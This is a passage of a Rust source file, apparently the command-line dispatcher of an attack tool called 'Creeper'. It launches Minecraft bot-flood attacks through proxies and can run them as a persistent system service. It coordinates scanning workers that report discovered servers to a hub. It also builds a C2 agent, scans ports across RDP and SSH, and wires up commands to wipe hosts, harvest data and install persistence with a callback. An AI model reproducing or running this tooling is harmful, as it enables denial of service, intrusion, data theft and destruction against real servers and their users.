                        eprintln!("❌ Failed to submit task: {} — {}", status, body);
                    }
                }
                Err(e) => {
                    eprintln!("❌ Failed to connect to hub {}: {}", hub_url, e);
                }
            }
        }

        Some(Commands::HubWorker { hub, worker_id, poll_interval }) => {
            let cfg = Config::load();
            let hub_url = cfg.resolve_hub_url(hub.as_deref(), None);
            let wid = worker_id.unwrap_or_else(|| {
                format!("worker-{}", std::process::id())
            });

            log::info!("Worker mode: hub={}, worker_id={}, poll_interval={}s",
                hub_url, wid, poll_interval);
            println!("Worker {} polling {} for tasks...", wid, hub_url);
            println!("Press Ctrl+C to stop.");

            loop {
                let url = format!("{}/tasks/dequeue?worker_id={}", hub_url.trim_end_matches('/'), wid);
                match reqwest::Client::new()
                    .get(&url)
                    .timeout(std::time::Duration::from_secs(10))
                    .send()
                    .await
                {
                    Ok(resp) => {
                        if resp.status().is_success() {
                            let body = resp.json::<serde_json::Value>().await?;
                            if body["success"].as_bool().unwrap_or(false) {
                                let task = body["task"].clone();
                                let task_id = task["id"].as_str().unwrap_or("");
                                let domains: Vec<String> = task["params"]["domains"]
                                    .as_array().unwrap_or(&vec![])
                                    .iter().filter_map(|v| v.as_str().map(String::from)).collect();
                                let ports: Vec<u16> = task["params"]["ports"]
                                    .as_array().unwrap_or(&vec![])
                                    .iter().filter_map(|v| v.as_u64().map(|u| u as u16)).collect();
                                let concurrency = task["params"]["concurrency"]
                                    .as_u64().unwrap_or(5) as usize;

                                log::info!("[Worker] Claimed task: {} ({} domains, {} ports)",
                                    task_id, domains.len(), ports.len());

                                let patterns: Vec<discover::DomainPattern> = domains
                                    .iter()
                                    .map(|d| discover::DomainPattern::parse(d))
                                    .collect::<Result<_, _>>()?;

                                let servers = discover::discover(&patterns, &ports, concurrency).await;

                                let discovered: Vec<serde_json::Value> = servers
                                    .iter()
                                    .map(|s| serde_json::json!({
                                        "host": s.host,
                                        "port": s.port,
                                    }))
                                    .collect();

                                let result_payload = serde_json::json!({
                                    "found_servers": servers.len(),
                                    "discovered": discovered,
                                });

                                let result_url = format!("{}/tasks/{}/result", hub_url.trim_end_matches('/'), task_id);
                                match reqwest::Client::new()
                                    .put(&result_url)
                                    .json(&result_payload)
                                    .timeout(std::time::Duration::from_secs(10))
                                    .send()
                                    .await
                                {
                                    Ok(r) => {
                                        if r.status().is_success() {
                                            log::info!("[Worker] Task {} completed: {} servers found",
                                                task_id, servers.len());
                                        } else {
                                            log::warn!("[Worker] Failed to submit result for {}: {}",
                                                task_id, r.status());
                                        }
                                    }
                                    Err(e) => {
                                        log::warn!("[Worker] Failed to submit result for {}: {}",
                                            task_id, e);
                                    }
                                }
                            } else {
                                log::debug!("[Worker] No tasks available");
                            }
                        } else {
                            log::warn!("[Worker] Hub returned {}", resp.status());
                        }
                    }
                    Err(e) => {
                        log::warn!("[Worker] Failed to poll hub {}: {}", hub_url, e);
                    }
                }

                tokio::time::sleep(std::time::Duration::from_secs(poll_interval)).await;
            }
        }

        Some(Commands::HubTasks { hub }) => {
            let cfg = Config::load();
            let hub_url = cfg.resolve_hub_url(hub.as_deref(), None);

            let url = format!("{}/tasks", hub_url.trim_end_matches('/'));
            match reqwest::Client::new()
                .get(&url)
                .timeout(std::time::Duration::from_secs(10))
                .send()
                .await
            {
                Ok(resp) => {
                    if resp.status().is_success() {
                        let tasks: Vec<serde_json::Value> = resp.json().await?;
                        if tasks.is_empty() {
                            println!("No tasks in queue.");
                        } else {
                            println!("\n=== {} Tasks ===", tasks.len());
                            for task in tasks {
                                let id = task["id"].as_str().unwrap_or("?");
                                let status = task["status"].as_str().unwrap_or("?");
                                let domains = task["params"]["domains"].as_array().map(|a| a.len()).unwrap_or(0);
                                let ports = task["params"]["ports"].as_array().map(|a| a.len()).unwrap_or(0);
                                let claimed = task["claimed_by"].as_str().unwrap_or("-");
                                println!("  {} | {} | {} domains | {} ports | claimed by: {}",
                                    id, status, domains, ports, claimed);
                            }
                        }
                    } else {
                        eprintln!("❌ Failed to fetch tasks: {}", resp.status());
                    }
                }
                Err(e) => {
                    eprintln!("❌ Failed to connect to hub {}: {}", hub_url, e);
                }
            }
        }

        Some(Commands::CdnCheck { domain }) => {
            let check = http_flood::check_cdn(&domain);
            http_flood::print_cdn_check(&check);
        }

        Some(Commands::C2Build { servers }) => {
            c2build::build_agent(&servers)?;
        }

        Some(Commands::McCrawl { targets, ports, concurrency, round_delay, port_delay_ms }) => {
            let targets_path = targets.unwrap_or_else(|| "./data/targets-template.json".to_string());
            
            let mut port_ranges = Vec::new();
            for part in ports.split(',') {
                let part = part.trim();
                if part.is_empty() { continue; }
                if let Some((lo_str, hi_str)) = part.split_once('-') {
                    let lo: u16 = lo_str.parse().map_err(|e| anyhow::anyhow!("invalid port: {}", e))?;
                    let hi: u16 = hi_str.parse().map_err(|e| anyhow::anyhow!("invalid port: {}", e))?;
                    port_ranges.push((lo, hi));
                } else {
                    let p: u16 = part.parse().map_err(|e| anyhow::anyhow!("invalid port: {}", e))?;
                    port_ranges.push((p, p));
                }
            }
            
            let config = crawl::CrawlConfig {
                targets_path,
                port_ranges,
                concurrency,
                delay_between_groups: Duration::from_secs(round_delay),
                delay_between_ports: Duration::from_millis(port_delay_ms),
                save_on_discovery: true,
            };
            
            log::info!("Starting crawl mode:");
            log::info!("  Targets file: {}", config.targets_path);
            log::info!("  Port ranges: {:?}", config.port_ranges);
            log::info!("  Concurrency: {}", config.concurrency);
            log::info!("  Round delay: {}s", config.delay_between_groups.as_secs());
            log::info!("  Port chunk delay: {}ms", config.delay_between_ports.as_millis());
            log::info!("  Save on discovery: {}", config.save_on_discovery);
            log::info!("Press Ctrl+C to stop.");
            
            crawl::crawl(config).await?;
        }

        Some(Commands::PortScan { target, ports, modes, concurrency }) => {
            // Parse target IPs
            let mut all_ips = Vec::new();
            for t in &target {
                match scanner::parse_ip_range(t) {
                    Ok(ips) => {
                        log::info!("Target {} → {} IP(s)", t, ips.len());
                        all_ips.extend(ips);
                    }
                    Err(e) => {
                        anyhow::bail!("Invalid target '{}': {}", t, e);
                    }
                }
            }
            if all_ips.is_empty() {
                anyhow::bail!("No valid targets");
            }

            // Parse ports
            let port_list = scanner::parse_ports(&ports)
                .map_err(|e| anyhow::anyhow!("Invalid ports '{}': {}", ports, e))?;

            // Parse modes
            let mode_list: Vec<String> = modes
                .split(',')
                .map(|s| s.trim().to_lowercase())
                .filter(|s| !s.is_empty())
                .collect();

            let valid_modes = ["tcp", "udp", "http", "icmp", "rdp", "ssh"];
            for m in &mode_list {
                if !valid_modes.contains(&m.as_str()) {
                    anyhow::bail!("Unknown scan mode '{}'. Valid: {}", m, valid_modes.join(", "));
                }
            }

            println!("┌─ Scan ─────────────────────────────────");
            println!("│ Targets : {} IP(s)", all_ips.len());
            println!("│ Ports   : {} port(s)", port_list.len());
            println!("│ Modes   : {}", mode_list.join(", "));
            println!("│ Workers : {concurrency}");
            println!("└────────────────────────────────────────");
            println!();

            let results = scanner::run_scan(all_ips, port_list, &mode_list, concurrency).await;
            scanner::print_results(&results);
        }

        Some(Commands::HostInfo) => {
            let info = c2core::collect_info();
            println!("┌─ Host Info ───────────────────────────────");
            println!("│ OS       : {}", info.os_name);
            println!("│ Hostname : {}", info.hostname);
            println!("│ Admin    : {}", info.is_admin);
            println!("│ Shells   :");
            for sh in &info.available_shells {
                println!("│   [{:?}] {} ({}){}",
                    sh.shell_type, sh.path, sh.version,
                    if sh.is_default { " [default]" } else { "" }
                );
            }
            println!("└───────────────────────────────────────────");
        }

        Some(Commands::HostMonitor { hub: hub_cli, interval }) => {
            let cfg = Config::load();
            let hub_url = cfg.resolve_hub_url(hub_cli.as_deref(), None);
            host::monitor_loop(&hub_url, interval).await?;
        }

        Some(Commands::HubServe { host, port, target }) => {
            sync::run_hub(&host, port, &target).await?;
        }

        Some(Commands::McJournal { host, port, hub: hub_cli }) => {
            let cfg = Config::load();
            let hub_url = cfg.resolve_hub_url(hub_cli.as_deref(), None);

            // CLI --hub 传了，或 config 里登记了节点/旧 url → 拉 hub
            let has_hub = hub_cli.is_some()
                || !cfg.hub.default_node.is_empty()
                || !cfg.hub.nodes.is_empty()
                || !cfg.hub.url.is_empty();
            if has_hub {
                // Pull journal from hub — show all servers
                if let Some(j) = sync::pull_from_hub(&hub_url).await {
                    if j.players.is_empty() {
                        println!("(empty journal)");
                    } else {
                        for (key, entries) in &j.players {
                            println!("┌─ Player Journal ────────────────────────────");
                            println!("│ Server  : {key}");
                            println!("│ Total   : {} entries", entries.len());
                            for entry in entries {
                                let role_tag = if entry.role == "未知" { "" } else { &format!(" [{}]", entry.role) };
                                println!("│ - {}{}", entry.name, role_tag);
                                if !entry.note.is_empty() {
                                    println!("│   Note: {}", entry.note);
                                }
                            }
                            println!("└──────────────────────────────────────────────");
                        }
                    }
                } else {
                    eprintln!("Failed to pull journal from {}", hub_url);
                }
            } else {
                // Local journal
                let host_str = host.clone().unwrap_or_else(|| "?".into());
                let journal = motd::PlayerJournal::load();
                journal.print_summary(&host_str, port);
            }
        }

        Some(Commands::HubQuery { url, hub, scope }) => {
            let cfg = Config::load();
            let hub_url = cfg.resolve_hub_url(hub.as_deref(), url.as_deref());

            match scope {
                // `creeper hub-query` (no scope) → 节点元信息（旧 print_node_status 风格）
                None => {
                    sync::print_node_status(&hub_url).await;
                }
                // `creeper hub-query --scope players` → full player journal
                Some(StatusScope::Players) => {
                    if let Some(j) = sync::pull_from_hub(&hub_url).await {
                        println!("{}", serde_json::to_string_pretty(&j).unwrap_or_default());
                    } else {
                        eprintln!("Failed to pull journal from {}", hub_url);
                    }
                }
                // `creeper hub-query --scope servers` → per-server overview
                Some(StatusScope::Servers) => {
                    if let Some(j) = sync::pull_from_hub(&hub_url).await {
                        let servers: Vec<serde_json::Value> = j.players.iter()
                            .map(|(srv, entries)| {
                                let names: Vec<&str> = entries.iter().map(|e| e.name.as_str()).collect();
                                serde_json::json!({
                                    "server": srv,
                                    "player_count": entries.len(),
                                    "players": names,
                                })
                            })
                            .collect();
                        let overview = serde_json::json!({
                            "hub": hub_url,
                            "server_count": servers.len(),
                            "total_players": j.players.values().map(|v| v.len()).sum::<usize>(),
                            "servers": servers,
                        });
                        println!("{}", serde_json::to_string_pretty(&overview).unwrap_or_default());
                    } else {
                        eprintln!("Failed to pull journal from {}", hub_url);
                    }
                }
                // `creeper hub-query --scope hosts` → host probes aggregated (from /host-report)
                Some(StatusScope::Hosts) => {
                    let url = format!("{}/host-report", hub_url.trim_end_matches('/'));
                    match reqwest::Client::new()
                        .get(&url)
                        .timeout(std::time::Duration::from_secs(10))
                        .send().await
                    {
                        Ok(resp) if resp.status().is_success() => {
                            let body: serde_json::Value = resp.json().await.unwrap_or_default();
                            println!("{}", serde_json::to_string_pretty(&body).unwrap_or_default());
                        }
                        Ok(resp) => eprintln!("Hub returned {} for {}", resp.status(), url),
                        Err(e) => eprintln!("Failed to reach {}: {}", url, e),
                    }
                }
                // `creeper hub-query --scope all` → merged: node meta + servers + players + hosts
                Some(StatusScope::All) => {
                    let status = sync::pull_status(&hub_url).await;
                    let journal = sync::pull_from_hub(&hub_url).await;
                    if status.is_none() && journal.is_none() {
                        eprintln!("Failed to reach hub {}", hub_url);
                        return Ok(());
                    }
                    let mut merged = serde_json::Map::new();
                    if let Some(s) = status {
                        if let Some(obj) = s.as_object() {
                            for (k, v) in obj { merged.insert(k.clone(), v.clone()); }
                        }
                    }
                    if let Some(j) = journal {
                        // Per-server overview
                        let servers: Vec<serde_json::Value> = j.players.iter()
                            .map(|(srv, entries)| {
                                let names: Vec<&str> = entries.iter().map(|e| e.name.as_str()).collect();
                                serde_json::json!({
                                    "server": srv,
                                    "player_count": entries.len(),
                                    "players": names,
                                })
                            })
                            .collect();
                        merged.insert("servers".into(), serde_json::json!(servers));
                        merged.insert("server_count".into(), serde_json::json!(servers.len()));
                        // Full journal too
                        merged.insert("journal".into(), serde_json::json!(j));
                    }
                    // hosts probe
                    let hr_url = format!("{}/host-report", hub_url.trim_end_matches('/'));
                    if let Ok(resp) = reqwest::Client::new().get(&hr_url).timeout(std::time::Duration::from_secs(10)).send().await {
                        if resp.status().is_success() {
                            if let Ok(body) = resp.json::<serde_json::Value>().await {
                                merged.insert("host_probes".into(), body);
                            }
                        }
                    }
                    merged.insert("hub".into(), serde_json::json!(hub_url));
                    println!("{}", serde_json::to_string_pretty(&merged).unwrap_or_default());
                }
            }
        }

        Some(Commands::McAnnotate { host, port, player, role, note }) => {
            let host = host.unwrap_or_else(|| "?".into());
            let mut journal = motd::PlayerJournal::load();
            journal.annotate(&host, port, &player, &role, &note);
            journal.save();
            journal.print_summary(&host, port);
        }

        Some(Commands::Tui { host: _, port: _, hub: hub_cli }) => {
            let cfg = Config::load();
            let hub_url = cfg.resolve_hub_url(hub_cli.as_deref(), None);
            tui::run_tui(Some(&hub_url)).await?;
        }

        Some(Commands::Service { action }) => {
            use service::daemon;
            let d = daemon();
            match action {
                ServiceAction::Install => {
                    d.install_service()?;
                    log::info!("creeper service installed");
                }
                ServiceAction::Uninstall => {
                    d.uninstall_service()?;
                    log::info!("creeper service uninstalled");
                }
                ServiceAction::Start => {
                    let cfg = Config::load();
                    let proxies = vec![];
                    let nicks = vec![];
                    d.start(false, || {
                        let rt = tokio::runtime::Builder::new_current_thread()
                            .enable_all().build().unwrap();
                        rt.block_on(run_attack(cfg, proxies, nicks));
                        Ok(())
                    })?;
                }
                ServiceAction::Stop => {
                    d.stop()?;
                }
                ServiceAction::Status => {
                    service::print_status(&d);
                }
                ServiceAction::Run => {
                    let cfg = Config::load();
                    let proxies = vec![];
                    let nicks = vec![];
                    // foreground mode — used by service manager (systemd/launchd/SCM)
                    d.start(true, || {
                        let rt = tokio::runtime::Builder::new_current_thread()
                            .enable_all().build().unwrap();
                        rt.block_on(run_attack(cfg, proxies, nicks));
                        Ok(())
                    })?;
                }
            }
        }

        Some(Commands::Backup { remote, output }) => {
            backup::run_backup(remote.as_deref(), output.as_deref()).await?;
        }

        Some(Commands::Wipe { platform, execute, yes, level }) => {
            attack_chain::run_wipe(&platform, &level, execute, yes);
        }

        Some(Commands::Harvest { platform, output, zip }) => {
            attack_chain::run_harvest(&platform, output.as_deref(), zip);
        }

        Some(Commands::Persist { platform, ssh_key, callback, execute }) => {
            attack_chain::run_persist(&platform, ssh_key.as_deref(), callback.as_deref(), execute);
        }

        Some(Commands::HidsCheck { json }) => {
            let report = hids::run_all();
            if json {
                println!("{}", serde_json::to_string_pretty(&report)?);
            } else {
                hids::print_report(&report);
            }
        }

        #[cfg(feature = "gui")]
        Some(Commands::Web { hub }) => {
            let cfg = Config::load();
            let hub_url = cfg.resolve_hub_url(hub.as_deref(), None);
            gui::run_gui(&hub_url).map_err(|e| anyhow::anyhow!("{}", e))?;
        }

        None => {
            use clap::CommandFactory;
            Cli::command().print_help()?;
        }
    }

    Ok(())
}

fn load_proxies_file(path: &str) -> anyhow::Result<Vec<protocol::ProxyInfo>> {
    let content = std::fs::read_to_string(path)?;
    let mut proxies = vec![];
    for line in content.lines() {
        let line = line.trim();
        if line.is_empty() || line.starts_with('#') { continue; }
        // Accept bare host:port as socks5://host:port for convenience
        let url = if line.contains("://") { line.to_owned() } else { format!("socks5://{line}") };
        match protocol::ProxyInfo::parse(&url) {
            Ok(p) => proxies.push(p),
            Err(e) => log::warn!("Skipping proxy '{}': {}", line, e),
        }
    }
    Ok(proxies)
}

/// Start an attack from configuration (used by both `start` and `service run`).
async fn run_attack(cfg: Config, proxies: Vec<protocol::ProxyInfo>, nicks: Vec<String>) {
    let options = options::Options {
        hostname: cfg.target.host.clone(),
        port: cfg.target.port,
        amount: cfg.target.count,
        join_delay_ms: cfg.target.join_delay_ms,
        bot_name_format: cfg.bot.name_format.clone(),
        game_version: match protocol::GameVersion::find_by_name(&cfg.target.version) {
            Some(v) => v,
            None => { log::error!("Unsupported version: {}", cfg.target.version); return; }
        },
        auto_register: cfg.bot.auto_register,
        max_attempts: cfg.bot.max_attempts,
    };

    log::info!("Starting Creeper → {}:{} ({} bots, max_attempts={})",
        options.hostname, options.port, options.amount, options.max_attempts);

    // Optionally ping the server before attacking
    if cfg.server.ping_on_start {
        log::info!("Pinging server {}:{} before attack ...", options.hostname, options.port);
        match motd::ping_java(&options.hostname, options.port, options.game_version.protocol_version().unwrap_or(-1)) {
            Ok(info) => {
                log::info!("Server online — {} {} ({}/{})",
                    info.game_version, info.motd, info.players_online, info.players_max);
            }
            Err(e) => {
                log::warn!("Server ping failed: {e} — proceeding anyway");
            }
        }
    }

    let mut attack = Creeper::new();
    if !proxies.is_empty() { attack.set_proxies(proxies); }
    if !nicks.is_empty() { attack.set_names(nicks); }
    attack.start(options).await;
}
